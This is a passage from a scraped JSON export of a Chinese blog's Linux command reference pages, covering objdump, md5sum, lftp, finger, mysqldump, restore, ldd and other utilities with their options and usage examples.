/root/test/04_libraryTest/mytest.cpp:6 c: 55 push %ebp d: 89 e5 mov %esp,%ebp f: 83 ec 10 sub $0x10,%esp /root/test/04_libraryTest/mytest.cpp:8 12: c7 45 fc 02 00 00 00 movl $0x2,0xfffffffc(%ebp) /root/test/04_libraryTest/mytest.cpp:9 19: 83 45 fc 02 addl $0x2,0xfffffffc(%ebp) /root/test/04_libraryTest/mytest.cpp:10 1d: c9 leave 1e: c3 ret 这里，项&quot;-d&quot;从 objfile 中反汇编那些特定指令机器码的 section，而使用&quot;-l&quot;指定用文件名和行号标注相应的目标代码，仅仅和-d、-D 或者-r 一起使用，使用-ld 和使用-d 的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g 之类的调试编译选项。 显示目标文件各个段的头部摘要信息： [root@localhost test]# objdump -h mytest.o mytest.o: file format elf32-i386 Sections: Idx Name Size VMA LMA File off Algn 0 .text 0000001f 00000000 00000000 00000034 2**2 CONTENTS, ALLOC, LOAD, readonly, CODE 1 .data 00000000 00000000 00000000 00000054 2**2 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 00000000 00000000 00000054 2**2 ALLOC 3 .debug_abbrev 00000046 00000000 00000000 00000054 2**0 CONTENTS, READONLY, DEBUGGING 4 .debug_info 000000ed 00000000 00000000 0000009a 2**0 CONTENTS, RELOC, READONLY, DEBUGGING 5 .debug_line 0000003e 00000000 00000000 00000187 2**0 CONTENTS, RELOC, READONLY, DEBUGGING 6 .debug_frame 00000044 00000000 00000000 000001c8 2**2 CONTENTS, RELOC, READONLY, DEBUGGING 7 .debug_loc 00000058 00000000 00000000 0000020c 2**0 CONTENTS, READONLY, DEBUGGING 8 .debug_pubnames 0000002f 00000000 00000000 00000264 2**0 CONTENTS, RELOC, READONLY, DEBUGGING 9 .debug_aranges 00000020 00000000 00000000 00000293 2**0 CONTENTS, RELOC, READONLY, DEBUGGING 10 .comment 0000002e 00000000 00000000 000002b3 2**0 CONTENTS, READONLY 11 .note.GNU-stack 00000000 00000000 00000000 000002e1 2**0 CONTENTS, READONLY 这里，更多的内容参见man objdump中的这个选项。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"objdump","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/objdump/","stats":{"text":"15 min read","time":859000,"words":3001,"minutes":15},"date":"2022-02-02 02:09:53","dateFormat":"2022-02-02"},{"content":"计算和校验文件报文摘要的工具程序。 补充说明 md5sum 命令采用 MD5 报文摘要算法（128 位）计算和检查文件的校验和。一般来说，安装了 Linux 后，就会有 md5sum 这个工具，直接在命令行终端直接运行。 MD5 算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest Algorithm 5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为 128 位（十六进制长度就是 32 位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。 语法 md5sum (选项) (参数) 选项 -b：二进制模式读取文件； -t或--text：把输入的文件作为文本文件看待； -c：从指定文件中读取MD5校验和，并进行校验； --status：验证成功时不输出任何信息； -w：当校验不正确时给出警告信息。 参数 文件：指定保存着文件名和校验和的文本文件。 实例 使用 md5sum 生成密码 另一种获取可用作密码的随机字符串的方法是计算 MD5 校验值！校验值看起来确实像是随机字符串组合在一起，我们可以用作密码。确保你的计算源是个变量，这样的话每次运行命令时生成的校验值都不一样。比如 date ！date 命令 总会生成不同的输出。 [root@localhost ~]# date | md5sum 6a43f2c246cdc3e6a3592652f831d186 - 生成一个文件 insert.sql 的 md5 值： [root@localhost ~]# md5sum insert.sql bcda6cb5c704664f989703ac5a88f112 insert.sql 检查文件 testfile 是否被修改过： 首先生成 md5 文件： md5sum testfile &gt; testfile.md5 检查： md5sum testfile -c testfile.md5 如果文件没有变化，输出应该如下： forsort: OK 此时，md5sum 命令返回 0。 如果文件发生了变化，输出应该如下： forsort: FAILED md5sum: WARNING: 1 of 1 computed checksum did NOT match 此时，md5sum 命令返回非 0。 这里，检查用的文件名随意。如果不想有任何输出，则md5sum testfile --status -c testfile.md5，这时候通过返回值来检测结果。 检测的时候如果检测文件非法则输出信息的选项: md5sum -w -c testfile.md5 输出之后，文件异常输出类似如下： md5sum: testfile.md5: 1: improperly formatted MD5 checksum line md5sum: testfile.md5: no properly formatted MD5 checksum lines found 这里，testfile.md5 只有一行信息，但是我认为地给它多加了一个字符，导致非法。如果 md5 文件正常那么-w有没有都一样。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"md5sum","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/md5sum/","stats":{"text":"3 min read","time":150000,"words":660,"minutes":3},"date":"2022-02-02 02:05:56","dateFormat":"2022-02-02"},{"content":"优秀的文件客户端程序。 补充说明 lftp 命令是一款优秀的文件客户端程序，它支持 ftp、SETP、HTTP 和 FTPs 等多种文件传输协议。lftp 支持 tab 自动补全，记不得命令双击 tab 键，就可以看到可能的选项了。 语法 lftp (选项) (参数) 选项 -f：指定 lftp 指令要执行的脚本文件； -c：执行指定的命令后退出； --help：显示帮助信息； --version：显示指令的版本号。 参数 站点：要访问的站点的 ip 地址或者域名。 实例 登录 ftp lftp 用户名:密码@ftp 地址:传送端口（默认 21） 也可以先不带用户名登录，然后在接口界面下用 login 命令来用指定账号登录，密码不显示。 查看文件与改变目录 lscd 对应 ftp 目录 下载 get 当然是可以的，还可以： mget -c *.pdf #把所有的pdf文件以允许断点续传的方式下载。 mirror aaa/ #将aaa目录整个的下载下来，子目录也会自动复制。 pget -c -n 10 file.dat #以最多10个线程以允许断点续传的方式下载file.dat，可以通过设置pget:default-n的值而使用默认值。 上传 同样的 put、mput 都是对文件的操作，和下载类似。 mirror -R 本地目录名 将本地目录以迭代（包括子目录）的方式反向上传到 ftp site。 模式设置 set ftp:charset gbk 远程 ftp site 用 gbk 编码，对应的要设置为 utf8,只要替换 gbk 为 utf8 即可。 set file:charset utf8 本地的 charset 设定为 utf8,如果你是 gbk，相应改掉。 set ftp:passive-mode 1 使用被动模式登录，有些 site 要求必须用被动模式或者主动模式才可以登录，这个开关就是设置这个的。0 代表不用被动模式。 书签 其实命令行也可以有书签，在 lftp 终端提示符下： bookmark add ustc 就可以把当前正在浏览的 ftp site 用 ustc 作为标签储存起来。以后在 shell 终端下，直接lftp ustc就可以自动填好用户名和密码，进入对应的目录了。 bookmark edit 会调用编辑器手动修改书签。当然，也可以看到，这个书签其实就是个简单的文本文件。密码，用户名都可以看到。 配置文件 vim /etc/lftp.conf 一般，我会添加这几行： set ftp:charset gbk set file:charset utf8 set pget:default-n 5 这样，就不用每次进入都要打命令了。其他的 set 可以自己 tab 然后 help 来看。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lftp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lftp/","stats":{"text":"3 min read","time":149000,"words":659,"minutes":3},"date":"2022-02-02 01:39:23","dateFormat":"2022-02-02"},{"content":"用于查找并显示用户信息。 补充说明 finger 命令用于查找并显示用户信息。包括本地与远端主机的用户皆可，帐号名称没有大小写的差别。单独执行 finger 指令，它会显示本地主机现在所有的用户的登陆信息，包括帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话。 语法 finger (选项) (参数) 选项 -l：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的 Shell，登入时间，转信地址，电子邮件状态，还有计划文件和方案文件内容； -m：排除查找用户的真实姓名； -s：列出该用户的帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话； -p：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的 Shell，登入时间，转信地址，电子邮件状态，但不显示该用户的计划文件和方案文件内容。 不指定 finger 的选项如果提供操作者的话，缺省设为-l输出风格，否则为-s风格，注意在两种格式中，如果信息不足，都有一些域可能丢失，如果没有指定参数 finger 会为当前登录的每个用户打印一个条目。 参数 用户名：指定要查询信息的用户。 实例 在计算机上使用 finger： [root@localhost root]# finger login Name Tty Idle Login time Office Office Phone root root tty1 2 Dec 18 13 root root pts/0 1 Dec 18 13 root root *pts/1 Dec 18 13 如果要查询远程机上的用户信息，需要在用户名后面接@主机名，采用用户名@主机名的格式，不过要查询的网络主机需要运行 finger 守护进程的支持。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"finger","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/finger/","stats":{"text":"2 min read","time":104000,"words":481,"minutes":2},"date":"2022-02-02 01:08:13","dateFormat":"2022-02-02"},{"content":"连接多个文件并以行为单位反向打印到标准输出。。 概要 tac [OPTION]... [FILE]... 主要用途 按行为单位反向显示文件内容，如果没有文件或文件为-则读取标准输入。 处理多个文件时，依次将每个文件反向显示，而不是将所有文件连在一起再反向显示。 参数 FILE（可选）：要处理的文件，可以为一或多个。 选项 长选项与短选项等价 -b, --before 在之前而不是之后连接分隔符。 -r, --regex 将分隔符作为基础正则表达式（BRE）处理。 -s, --separator=STRING 使用STRING作为分隔符代替默认的换行符。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回状态为成功除非给出了非法选项或非法参数。 例子 # 选自官方info文档的例子： # 一个接着一个字符的反转一个文件： tac -r -s 'x\\|[^x]' test.log # 关于-b选项： seq 1 3 |tac # 输出 3 2 1 # 使用-b选项： seq 1 3 |tac -b # 输出，注意21后面没有换行符： 3 21 # 前一个例子相当于将 '1\\n2\\n3\\n' 转换为 '3\\n2\\n1\\n' # 前一个例子相当于将 '1\\n2\\n3\\n' 转换为 '\\n\\n3\\n21' 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 tac或info coreutils 'tac invocation'。 关于基础正则表达式（BRE）的内容，详见man -s 1 grep的REGULAR EXPRESSIONS段落。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tac","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tac/","stats":{"text":"2 min read","time":89000,"words":385,"minutes":2},"date":"2022-02-01 23:11:56","dateFormat":"2022-02-01"},{"content":"显示文件内容，每次显示一屏。 补充说明 more 命令是一个基于 vi 编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持 vi 中的关键字定位操作。more 名单中内置了若干快捷键，常用的有 H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。 该命令一次显示一屏文本，满屏后停下来，并且在屏幕的底部出现一个提示信息，给出至今己显示的该文件的百分比：--More--（XX%）可以用下列不同的方法对提示做出回答： 按 Space 键：显示文本的下一屏内容。 按 Enter 键：只显示文本的下一行内容。 按斜线符|：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。 按 H 键：显示帮助屏，该屏上有相关的帮助信息。 按 B 键：显示上一屏内容。 按 Q 键：退出 more 命令。 语法 more(语法) (参数) 选项 -&lt;数字&gt;：指定每屏显示的行数； -d：显示“[press space to continue,'q' to quit.]”和“[Press 'h' for instructions]”； -c：不进行滚屏操作。每次刷新这个屏幕； -s：将多个空行压缩成一行显示； -u：禁止下划线； +&lt;数字&gt;：从指定数字的行开始显示。 参数 文件：指定分页显示内容的文件。 实例 显示文件 file 的内容，但在显示之前先清屏，并且在屏幕的最下方显示完成的百分比。 more -dc file 显示文件 file 的内容，每 10 行显示一次，而且在显示之前先清屏。 more -c -10 file ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"more","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/more/","stats":{"text":"2 min read","time":95000,"words":437,"minutes":2},"date":"2022-02-01 23:09:36","dateFormat":"2022-02-01"},{"content":"显示本机的 USB 设备列表信息。 补充说明 lsusb 命令用于显示本机的 USB 设备列表，以及 USB 设备的详细信息。 lsusb 命令是一个学习 USB 驱动开发，认识 USB 设备的助手，推荐大家使用，如果您的开发板中或者产品中没有 lsusb 命令可以自己移植一个，放到文件系统里面。 语法 lsusb (选项) 选项 -v：显示 USB 设备的详细信息； -s&lt;总线：设备号&gt;仅显示指定的总线和（或）设备号的设备； -d&lt;厂商：产品&gt;：仅显示指定厂商和产品编号的设备； -t：以树状结构显示无理 USB 设备的层次； -V：显示命令的版本信息。 实例 插入 usb 鼠标后执行 lsusb 的输出内容如下: Bus 005 Device 001: id 0000:0000 Bus 001 Device 001: ID 0000:0000 Bus 004 Device 001: ID 0000:0000 Bus 003 Device 001: ID 0000:0000 Bus 002 Device 006: ID 15d9:0a37 Bus 002 Device 001: ID 0000:0000 解释： Bus 005 表示第五个 usb 主控制器 (机器上总共有 5 个 usb 主控制器 -- 可以通过命令 lspci | grep USB 查看) Device 006 表示系统给 usb 鼠标分配的设备号 (devnum)，同时也可以看到该鼠标是插入到了第二个 usb 主控制器 006 usb_device.devnum /sys/devices/pci0000:00/0000:00:1d.1/usb2/2-2/devnum ID 15d9:0a37 表示 usb 设备的 ID（这个 ID 由芯片制造商设置，可以唯一表示该设备） 15d9 usb_device_descriptor.idVendor 0a37 usb_device_descriptor.idProduct /sys/devices/pci0000:00/0000:00:1d.1/usb2/2-2/idVendor Bus 002 Device 006: ID 15d9:0a37 Bus 002 Device 001: ID 0000:0000 表示 002 号 usb 主控制器上接入了两个设备: 一个是 usb 根 Hub -- 001 一个是 usb 鼠标 -- 006 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lsusb","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lsusb/","stats":{"text":"2 min read","time":111000,"words":438,"minutes":2},"date":"2022-02-01 23:08:31","dateFormat":"2022-02-01"},{"content":"用来删除空目录。 补充说明 rmdir 命令用来删除空目录。当目录不再被使用时，或者磁盘空间已到达使用限定值，就需要删除失去使用价值的目录。利用 rmdir 命令可以从一个目录中删除一个或多个空的子目录。该命令从一个目录中删除一个或多个子目录，其中 dirname 佬表示目录名。如果 dirname 中没有指定路径，则删除当前目录下由 dirname 指定的目录； 如 dirname 中包含路径，则删除指定位置的目录。删除目录时，必须具有对其父目录的写权限。 注意：子目录被删除之前应该是空目录。就是说，该目录中的所有文件必须用 rm 命令全部，另外，当前工作目录必须在被删除目录之上，不能是被删除目录本身，也不能是被删除目录的子目录。 虽然还可以用带有-r选项的 rm 命令递归删除一个目录中的所有文件和该目录本身，但是这样做存在很大的危险性。 语法 rmdir (选项) (参数) 选项 -p 或--parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除； --ignore-fail-on-non-empty：此选项使 rmdir 命令忽略由于删除非空目录时导致的错误信息； -v 或-verboes：显示命令的详细执行过程； --help：显示命令的帮助信息； --version：显示命令的版本信息。 参数 目录列表：要删除的空目录列表。当删除多个空目录时，目录名之间使用空格隔开。 实例 将工作目录下，名为 www 的子目录删除 : rmdir www 在工作目录下的 www 目录中，删除名为 Test 的子目录。若 Test 删除后，www 目录成为空目录，则 www 亦予删除。 rmdir -p www/Test 下面命令等价于 rmdir a/b/c, rmdir a/b, rmdir a rmdir -p a/b/c ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rmdir","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rmdir/","stats":{"text":"2 min read","time":112000,"words":519,"minutes":2},"date":"2022-02-01 23:08:17","dateFormat":"2022-02-01"},{"content":"查看 Linux 中的指令帮助。 补充说明 man 命令是 Linux 下的帮助指令，通过 man 指令可以查看 Linux 中的指令帮助、配置文件帮助和编程帮助等信息。 语法 man (选项) (参数) 选项 -a：在所有的 man 帮助手册中搜索； -f：等价于 whatis 指令，显示给定关键字的简短描述信息； -P：指定内容时使用分页程序； -M：指定 man 手册搜索的路径。 参数 数字：指定从哪本 man 手册中搜索帮助； 关键字：指定要搜索帮助的关键字。 数字代表内容 1：用户在shell环境可操作的命令或执行文件； 2：系统内核可调用的函数与工具等 3：一些常用的函数(function)与函数库(library)，大部分为C的函数库(libc) 4：设备文件说明，通常在/dev下的文件 5：配置文件或某些文件格式 6：游戏(games) 7：惯例与协议等，如Linux文件系统，网络协议，ASCII code等说明 8：系统管理员可用的管理命令 9：跟kernel有关的文件 实例 我们输入man ls，它会在最左上角显示“LS（1）”，在这里，“LS”表示手册名称，而“（1）”表示该手册位于第一节章，同样，我们输man ifconfig它会在最左上角显示“IFCONFIG（8）”。也可以这样输入命令：“man [章节号 ] 手册名称”。 man 是按照手册的章节号的顺序进行搜索的，比如： man sleep 只会显示 sleep 命令的手册,如果想查看库函数 sleep，就要输入: man 3 sleep ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"man","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/man/","stats":{"text":"2 min read","time":91000,"words":413,"minutes":2},"date":"2022-02-01 23:07:26","dateFormat":"2022-02-01"},{"content":"显示数据包到主机间的路径。 补充说明 traceroute 命令用于追踪数据包在网络上的传输时的全部路径，它默认发送的数据包大小是 40 字节。 通过 traceroute 我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地 (destination) 走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。 traceroute 通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备 traceroute 要测 3 次。输出结果中包括每次测试的时间 (ms) 和设备的名称（如有的话）及其 ip 地址。 语法 traceroute (选项) (参数) 选项 -d：使用 Socket 层级的排错功能； -f&lt;存活数值&gt;：设置第一个检测数据包的存活数值 TTL 的大小； -F：设置勿离断位； -g&lt;网关&gt;：设置来源路由网关，最多可设置 8 个； -i&lt;网络界面&gt;：使用指定的网络界面送出数据包； -I：使用 ICMP 回应取代 UDP 资料信息； -m&lt;存活数值&gt;：设置检测数据包的最大存活数值 TTL 的大小； -n：直接使用 IP 地址而非主机名称； -p&lt;通信端口&gt;：设置 UDP 传输协议的通信端口； -r：忽略普通的 Routing Table，直接将数据包送到远端主机上。-s&lt;来源地址&gt;：设置本地主机送出数据包的 IP 地址； -t&lt;服务类型&gt;：设置检测数据包的 TOS 数值； -v：详细显示指令的执行过程； -w&lt;超时秒数&gt;：设置等待远端主机回报的时间； -x：开启或关闭数据包的正确性检验。 参数 主机：指定目的主机 IP 地址或主机名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"traceroute","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/traceroute/","stats":{"text":"2 min read","time":111000,"words":511,"minutes":2},"date":"2022-02-01 23:07:10","dateFormat":"2022-02-01"},{"content":"MySQL 数据库中备份工具。 补充说明 mysqldump 命令是 mysql 数据库中备份工具，用于将 MySQL 服务器中的数据库以标准的 sql 语言的方式导出，并保存到文件中。 语法 mysqldump (选项) 选项 --add-drop-table：在每个创建数据库表语句前添加删除数据库表的语句； --add-locks：备份数据库表时锁定数据库表； --all-databases：备份 MySQL 服务器上的所有数据库； --comments：添加注释信息； --compact：压缩模式，产生更少的输出； --complete-insert：输出完成的插入语句； --databases：指定要备份的数据库； --default-character-set：指定默认字符集； --force：当出现错误时仍然继续备份操作； --host：指定要备份数据库的服务器； --lock-tables：备份前，锁定所有数据库表； --no-create-db：禁止生成创建数据库语句； --no-create-info：禁止生成创建数据库库表语句； --password：连接 MySQL 服务器的密码； --port：MySQL 服务器的端口号； --user：连接 MySQL 服务器的用户名。 实例 导出整个数据库 mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名 mysqldump -u linuxde -p smgp_apps_linuxde &gt; linuxde.sql 导出一个表 mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名 mysqldump -u linuxde -p smgp_apps_linuxde users &gt; linuxde_users.sql 导出一个数据库结构 mysqldump -u linuxde -p -d --add-drop-table smgp_apps_linuxde &gt; linuxde_db.sql -d没有数据，--add-drop-table 每个 create 语句之前增加一个drop table ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mysqldump","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mysqldump/","stats":{"text":"2 min read","time":90000,"words":380,"minutes":2},"date":"2022-02-01 23:06:37","dateFormat":"2022-02-01"},{"content":"所进行的操作和 dump 指令相反。 补充说明 restore 命令是 dump 命令的逆过程，用于还原 dump 命令生成的备份文件。倾倒操作可用来备份文件，而还原操作则是写回这些已备份的文件。 语法 restore (选项) 选项 -b&lt;区块大小&gt;：设置区块大小，单位为 Byte； -c：不检查倾倒操作的备份格式，仅准许读取使用旧格式的备份文件； -C：使用对比模式，将备份的文件与现行的文件相互对比； -D&lt;文件系统&gt;：允许用户指定文件系统的名称； -f&lt;备份文件&gt;：从指定的文件中读取备份数据，进行还原操作； -h：仅解除目录而不包括与该目录相关的所有文件； -i：使用互动模式，在进行还原操作时，restore 指令将依序询问用户； -m：解开符合指定的 inode 编号的文件或目录而非用文件名称指定； -r：进行还原操作； -R：全面还原文件系统时，检查应从何处开始进行； -s&lt;文件编号&gt;：当备份数据超过一卷磁带时，用户可以指定备份文件的编号； -t：指定文件名称，若该文件已存在备份文件中，则列出它们的名称； -v：显示指令执行过程； -x：设置文件名称，且从指定的存储媒体里读入它们，若该文件已存在在备份文件中，则将其还原到文件系统内； -y：不询问任何问题，一律以同意回答并继续执行指令。 实例 dump -9 -u -f /dev/hda3 /home/frank/ 用 restore 命令来恢复备份： restore rf /dev/hda3 /home/frank 用 restore 命令来查看备份文件里的文件列表： restore ft /dev/hda3 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"restore","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/restore/","stats":{"text":"2 min read","time":102000,"words":470,"minutes":2},"date":"2022-02-01 23:05:48","dateFormat":"2022-02-01"},{"content":"查看 Linux 系统负载信息。 补充说明 uptime 命令能够打印系统总共运行了多长时间和系统的平均负载。uptime 命令可以显示的信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的 1 分钟、5 分钟和 15 分钟内的平均负载。 语法 uptime (选项) 选项 -V：显示指令的版本信息。 实例 使用 uptime 命令查看系统负载： [root@LinServ-1 ~]# uptime -V #显示uptime命令版本信息 procps version 3.2.7 [root@LinServ-1 ~]# uptime 15:31:30 up 127 days, 3:00, 1 user, load average: 0.00, 0.00, 0.00 显示内容说明： 15:31:30 # 系统当前时间 up 127 days, 3:00 # 主机已运行时间,时间越大，说明你的机器越稳定。 1 user # 用户连接数，是总连接数而不是用户数 load average: 0.00, 0.00, 0.00 # 系统平均负载，统计最近1，5，15分钟的系统平均负载 那么什么是系统平均负载呢？ 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。 如果每个 CPU 内核的当前活动进程数不大于 3 的话，那么系统的性能是良好的。如果每个 CPU 内核的任务数大于 5，那么这台机器的性能有严重问题。 如果你的 linux 主机是 1 个双核 CPU 的话，当 Load Average 为 6 的时候说明机器已经被充分使用了。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uptime","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uptime/","stats":{"text":"2 min read","time":91000,"words":393,"minutes":2},"date":"2022-02-01 23:05:10","dateFormat":"2022-02-01"},{"content":"VirtualBox 软件挂载 VDI 分区文件工具。 补充说明 vdfuse 命令是 VirtualBox 软件挂载 VDI 分区文件的一个工具，VirtualBox 是一款能创建虚拟机的开源软件，vdi 是它的默认磁盘格式。 什么是 VirtualBox VirtualBox 是一款功能强大的 x86 虚拟机软件，它不仅具有丰富的特色，而且性能也很优异。更可喜的是，VirtualBox 于数日前走向开源，成为了一个发布在 GPL 许可之下的自由软件。VirtualBox 可以在 Linux 和 Windows 主机中运行，并支持在其中安装 Windows (NT 4.0、2000、XP、Server 2003、Vista)、DOS/Windows 3.x、Linux (2.4 和 2.6)、OpenBSD 等系列的客户操作系统。 在 Ubuntu 中安装 vdfuse，打开终端，输入： sudo apt-get install virtualbox-fuse 语法 vdfuse [options] -f image-file mountpoint 选项 -h 帮助 -r 只读 -t 类型 (VDI, VMDK, VHD, or raw; default: auto) -f 镜像文件 -a 允许所有用户读取 -w 允许所有用户都写 -g 前台运行 -v 输出反馈 -d debug模式 注意：必须编辑一下/etc/fuse.confand，去掉 &quot;user_allow_other&quot; 前面的注释符号（#），否则不能正确运行。 实例 使用如下如下语句挂载.vdi 文件： sudo vdfuse -f /path/to/file.vdi /path/to/mountpoint /path/to/mountpoint应该包含如下文件 EntireDisk、Partition1 等，如果只有一个文件，你可能需要这样挂载： mount /path/to/mountpoint/Partition1 /path/to/someother/mountpoint 文件系统就挂载到/path/to/someother/mountpoint了。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vdfuse","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vdfuse/","stats":{"text":"2 min read","time":91000,"words":369,"minutes":2},"date":"2022-02-01 23:03:21","dateFormat":"2022-02-01"},{"content":"打印程序或者库文件所依赖的共享库列表。 补充说明 ldd 命令用于打印程序或者库文件所依赖的共享库列表。 语法 ldd (选项) (参数) 选项 --version：打印指令版本号； -v：详细信息模式，打印所有相关信息； -u：打印未使用的直接依赖； -d：执行重定位和报告任何丢失的对象； -r：执行数据对象和函数的重定位，并且报告任何丢失的对象和函数； --help：显示帮助信息。 参数 文件：指定可执行程序或者文库。 其他介绍 首先 ldd 不是一个可执行程序，而只是一个 shell 脚本 ldd 能够显示可执行模块的 dependency，其原理是通过设置一系列的环境变量，如下：LD_TRACE_LOADED_OBJECTS、LD_WARN、LD_BIND_NOW、LD_LIBRARY_VERSION、LD_VERBOSE等。当LD_TRACE_LOADED_OBJECTS环境变量不为空时，任何可执行程序在运行时，它都会只显示模块的 dependency，而程序并不真正执行。要不你可以在 shell 终端测试一下，如下： export LD_TRACE_LOADED_OBJECTS=1 再执行任何的程序，如 ls 等，看看程序的运行结果。 ldd 显示可执行模块的 dependency 的工作原理，其实质是通过 ld-linux.so（elf 动态库的装载器）来实现的。我们知道，ld-linux.so 模块会先于 executable 模块程序工作，并获得控制权，因此当上述的那些环境变量被设置时，ld-linux.so 选择了显示可执行模块的 dependency。 实际上可以直接执行 ld-linux.so 模块，如：/lib/ld-linux.so.2 --list program（这相当于 ldd program） ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ldd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ldd/","stats":{"text":"2 min read","time":91000,"words":412,"minutes":2},"date":"2022-02-01 23:02:05","dateFormat":"2022-02-01"},{"content":"在屏幕上显示指定文件的末尾若干行内容，通常用于日志文件的跟踪输出。 补充说明 tailf 命令几乎等同于tail -f，严格说来应该与tail --follow=name更相似些。当文件改名之后它也能继续跟踪，特别适合于日志文件的跟踪（follow the growth of a log file）。与tail -f不同的是，如果文件不增长，它不会去访问磁盘文件。tailf 特别适合那些便携机上跟踪日志文件，因为它能省电，因为减少了磁盘访问。tailf 命令不是个脚本，而是一个用 C 代码编译后的二进制执行文件，某些 Linux 安装之后没有这个命令。 tailf 和 tail -f 的区别 tailf 总是从文件开头一点一点的读， 而 tail -f 则是从文件尾部开始读 tailf check 文件增长时，使用的是文件名， 用 stat 系统调用； 而 tail -f 则使用的是已打开的文件描述符； 注：tail 也可以做到类似跟踪文件名的效果； 但是 tail 总是使用 fstat 系统调用，而不是 stat 系统调用； 结果就是：默认情况下，当 tail 的文件被偷偷删除时，tail 是不知道的，而 tailf 是知道的。 语法 tailf logfile # 动态跟踪日志文件 logfile，最初的时候打印文件的最后 10 行内容。 选项 -n, --lines NUMBER # 输出最后数行 -NUMBER # 与NUMBER相同 `-n NUMBER' -V, --version # 输出版本信息并退出 -h, --help # 显示帮助并退出 参数 目标：指定目标日志。 实例 tailf log/WEB.LOG tailf -n 5 log2014.log # 显示文件最后5行内容 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tailf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tailf/","stats":{"text":"2 min read","time":96000,"words":426,"minutes":2},"date":"2022-02-01 23:00:18","dateFormat":"2022-02-01"},{"content":"在对象文件或二进制文件中查找可打印的字符串。 补充说明 strings 命令在对象文件或二进制文件中查找可打印的字符串。字符串是 4 个或更多可打印字符的任意序列，以换行符或空字符结束。 strings 命令对识别随机对象文件很有用。 语法 strings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ] [file ... ] 选项 -a --all：扫描整个文件而不是只扫描目标文件初始化和装载段 -f –print-file-name：在显示字符串前先显示文件名 -n –bytes=[number]：找到并且输出所有NUL终止符序列 - ：设置显示的最少的字符数，默认是4个字符 -t --radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制 -o ：类似--radix=o -T --target= ：指定二进制文件格式 -e 